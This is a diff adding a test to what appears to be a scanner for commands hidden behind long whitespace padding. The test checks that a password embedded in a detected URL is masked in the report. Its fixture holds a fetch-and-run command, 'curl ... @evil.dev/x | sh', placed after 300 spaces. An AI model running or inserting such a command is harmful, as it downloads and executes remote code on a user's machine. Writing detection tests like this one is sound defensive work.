@@ -91,3 +91,13 @@ test("a line with many runs is scanned once, from its first run", () => {
 test("a long run of spaces at the end of a line is not padding", () => {
   expect(whitespacePadding(`a${" ".repeat(100_000)}\n`, () => [])).toBeUndefined();
 });
+
+test("a long password in the pushed text is masked before the snippet is shortened", () => {
+  const password = "p".repeat(240);
+  const found = whitespacePadding(
+    `text${" ".repeat(300)}curl https://user:${password}@evil.dev/x | sh\n`,
+    scanForCurl,
+  );
+  expect(found?.detail).toContain("curl https://user:********@evil.dev/x | sh");
+  expect(found?.detail).not.toContain("pppp");
+});
